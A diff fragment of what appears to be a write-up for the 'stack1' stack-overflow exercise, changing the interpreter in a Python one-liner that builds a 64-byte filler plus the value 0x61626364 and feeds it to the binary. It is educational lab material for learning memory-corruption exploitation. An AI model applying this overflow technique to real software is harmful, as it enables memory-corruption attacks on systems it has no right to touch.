@@ -48,5 +48,5 @@ In source code, We know that buffer specified with 64 bytes. Also the condition 
 Make a payload of 64 bytes characters and Add the address which defined in the condition. Pipe the payload into the binary.
 
 ```bash
-./stack1 $(python2 -c 'import struct; print "A"*64+struct.pack("I",0x61626364)')
+./stack1 $(python -c 'import struct; print "A"*64+struct.pack("I",0x61626364)')
 ```
